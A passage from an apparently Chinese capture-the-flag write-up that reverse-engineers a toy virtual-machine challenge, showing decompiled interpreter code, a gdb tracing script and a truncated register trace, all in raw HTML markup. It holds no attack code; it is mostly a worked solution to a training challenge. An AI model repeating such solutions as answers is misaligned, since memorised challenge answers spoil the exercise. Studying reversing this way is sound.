( (a2 &amp; <span class="hljs-number">0x100000</span>) != <span class="hljs-number">0</span> )<br>    interpret_add(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x40000</span>) != <span class="hljs-number">0</span> )<br>    interpret_stk(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x80000</span>) != <span class="hljs-number">0</span> )<br>    interpret_stm(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x20000</span>) != <span class="hljs-number">0</span> )<br>    interpret_ldm(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x800000</span>) != <span class="hljs-number">0</span> )<br>    interpret_cmp(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x400000</span>) != <span class="hljs-number">0</span> )<br>    interpret_jmp(a1, a2);<br>  result = BYTE2(a2) &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x10000</span>) != <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> interpret_sys(a1, a2);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>看一下新操作<code>STK</code>所做的操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">interpret_stk</span><span class="hljs-params">(__int64 a1, __int16 a2)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 v5; <span class="hljs-comment">// al</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v7; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 memory; <span class="hljs-comment">// al</span><br><br>  v2 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)describe_register(HIBYTE(a2));<br>  v3 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)describe_register((<span class="hljs-type">unsigned</span> __int8)a2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[s] STK %s %s\n&quot;</span>, v3, v2);<br>  <span class="hljs-keyword">if</span> ( HIBYTE(a2) )<br>  &#123;<br>    v4 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)describe_register(HIBYTE(a2));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[s] ... pushing %s\n&quot;</span>, v4);<br>    ++*(_BYTE *)(a1 + <span class="hljs-number">1028</span>);<br>    v5 = read_register(a1, HIBYTE(a2));<br>    write_memory(a1, *(<span class="hljs-type">unsigned</span> __int8 *)(a1 + <span class="hljs-number">1028</span>), v5);<br>  &#125;<br>  result = (<span class="hljs-type">unsigned</span> __int8)a2;<br>  <span class="hljs-keyword">if</span> ( (_BYTE)a2 )<br>  &#123;<br>    v7 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)describe_register((<span class="hljs-type">unsigned</span> __int8)a2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[s] ... popping %s\n&quot;</span>, v7);<br>    memory = read_memory(a1, *(<span class="hljs-type">unsigned</span> __int8 *)(a1 + <span class="hljs-number">1028</span>));<br>    write_register(a1, (<span class="hljs-type">unsigned</span> __int8)a2, memory);<br>    result = a1;<br>    --*(_BYTE *)(a1 + <span class="hljs-number">1028</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看出，这是模拟栈，并且把栈地址设置为<code>a1[1028]</code></p>
<p>最后做出来，感觉不太需要关心这个栈，其实只需要看CMP指令，然后发现它第一个比较的数是<code>a1[0x3b]</code>和<code>a1[0xa9]</code>，第二个比较的数是<code>a1[3a]</code>和<code>a1[a8]</code>。一个逆序比较，那么不用管，只需要调整一下顺序就可以了。把前俩放到最后就行了。</p>
<h4 id="level19-1"><a href="#level19-1" class="headerlink" title="level19.1"></a>level19.1</h4><p>我们通过gdb脚本，然后拿到对应的opcode以及arg1和arg2。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">b <span class="hljs-number">*0</span>x589192137cd1<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$fd</span> = fopen(<span class="hljs-string">&quot;/home/hacker/Desktop/rsi.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br><br><span class="hljs-keyword">while</span> 1<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rsi_value</span> = <span class="hljs-variable">$rsi</span><br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$a</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x400)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$b</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x401)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$c</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x402)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$d</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x403)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$s</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x404)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$i</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x405)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$f</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x406)<br>    call fprintf(<span class="hljs-variable">$fd</span>,<span class="hljs-string">&quot;a:%x b:%x c:%x d:%x s:%x i:%x f:%x\n&quot;</span>, <span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>,<span class="hljs-variable">$d</span>,<span class="hljs-variable">$s</span>,<span class="hljs-variable">$i</span>,<span class="hljs-variable">$f</span>)<br>    call fprintf(<span class="hljs-variable">$fd</span>, <span class="hljs-string">&quot;0x%lx\n&quot;</span>, <span class="hljs-variable">$rsi_value</span>)<br><br>    continue<br>end<br><br>call fclose(<span class="hljs-variable">$fd</span>)<br>quit<br></code></pre></td></tr></table></figure>

<p>这个break的地址是通过gdb调试过程中拿到的，其实就是死循环中调用的那个函数的call指令的地址。然后，<code>$rax</code>在这时存储的是a1的首地址，然后我们发现偏移地址就是+0x403，这可以通过调试或者19.0这个level拿到。然后，就打印出来<code>a,b,c,d,s,i,f</code>变量的值。以此来判断，我们要发送的字符串，以及其做的代码混淆处理。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20402</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">2</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">2</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x801004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">2</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">3</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x204c2</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:c2 s:<span class="hljs-number">0</span> i:<span class="hljs-number">4</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2206c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>c d:c2 s:<span class="hljs-number">0</span> i:<span class="hljs-number">5</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>c d:c2 s:<span class="hljs-number">0</span> i:<span class="hljs-number">6</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2044d</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>c d:<span class="hljs-number">4</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">7</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2206d</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>d d:<span class="hljs-number">4</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">8</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>d d:<span class="hljs-number">4</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">9</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20442</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>d d:<span class="hljs-number">42</span> s:<span class="hljs-number">0</span> i:a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2206e</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>e d:<span class="hljs-number">42</span> s:<span class="hljs-number">0</span> i:b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>e d:<span class="hljs-number">42</span> s:<span class="hljs-number">0</span> i:c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20482</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>e d:<span class="hljs-number">82</span> s:<span class="hljs-number">0</span> i:d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2206f</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>f d:<span class="hljs-number">82</span> s:<span class="hljs-number">0</span> i:e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>f d:<span class="hljs-number">82</span> s:<span class="hljs-number">0</span> i:f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2042d</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>f d:<span class="hljs-number">2</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">10</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22070</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">70</span> d:<span class="hljs-number">2</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">11</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">70</span> d:<span class="hljs-number">2</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">12</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x204e5</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">70</span> d:e5 s:<span class="hljs-number">0</span> i:<span class="hljs-number">13</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22071</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">71</span> d:e5 s:<span class="hljs-number">0</span> i:<span class="hljs-number">14</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">71</span> d:e5 s:<span class="hljs-number">0</span> i:<span class="hljs-number">15</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20464</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">71</span> d:<span class="hljs-number">64</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">16</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22072</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">72</span> d:<span class="hljs-number">64</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">17</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">72</span> d:<span class="hljs-number">64</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">18</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20498</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">72</span> d:<span class="hljs-number">98</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">19</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22073</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">73</span> d:<span class="hljs-number">98</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">73</span> d:<span class="hljs-number">98</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x204f7</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">73</span> d:f7 s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22074</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">74</span> d:f7 s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">74</span> d:f7 s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x204ac</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">74</span> d:ac s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22075</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">75</span> d:ac s:<span class="hljs-number">0</span> i:<span class="hljs-number">20</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">75</span> d:ac s:<span class="hljs-number">0</span> i:<span class="hljs-number">21</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20465</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">75</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">22</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22076</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">23</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">24</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x21024</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">25</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">1</span> i:<span class="hljs-number">26</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">2</span> i:<span class="hljs-number">27</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800020</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">28</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x24001</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">1</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">29</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x14008</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2044b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">4</span>b s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">4</span>b s:<span class="hljs-number">4</span> i:<span class="hljs-number">2</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20445</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">45</span> s:<span class="hljs-number">4</span> i:<span class="hljs-number">2</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">45</span> s:<span class="hljs-number">5</span> i:<span class="hljs-number">2</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20459</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">59</span> s:<span class="hljs-number">5</span> i:<span class="hljs-number">2</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">59</span> s:<span class="hljs-number">6</span> i:<span class="hljs-number">30</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2043a</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">3</span>a s:<span class="hljs-number">6</span> i:<span class="hljs-number">31</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">3</span>a s:<span class="hljs-number">7</span> i:<span class="hljs-number">32</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20420</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">20</span> s:<span class="hljs-number">7</span> i:<span class="hljs-number">33</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">20</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">34</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22005</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">20</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">35</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">20</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">36</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x100104</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span 